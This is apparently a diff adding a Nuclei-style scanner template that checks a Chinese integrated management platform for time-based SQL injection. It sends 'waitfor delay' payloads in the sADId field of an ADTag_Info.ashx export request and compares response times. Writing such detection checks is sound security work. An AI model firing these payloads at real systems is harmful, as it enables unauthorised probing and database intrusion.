@@ -1,0 +1,55 @@
+id: poc-yaml-windor-icmp-sadid-sqli
+info:
+  name: 银达汇智 智慧综合管理平台 sADId SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 银达汇智
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "智慧综合管理平台登入"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        action=exportExcel&sADId='waitfor+delay'0:0:5'--
+      - |
+        POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        action=exportExcel&sADId='waitfor+delay'0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "application/vnd"
+        part: header
+      - type: regex
+        regex:
+          - ".xlsx"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+      - type: status
+        status:
+          - 200
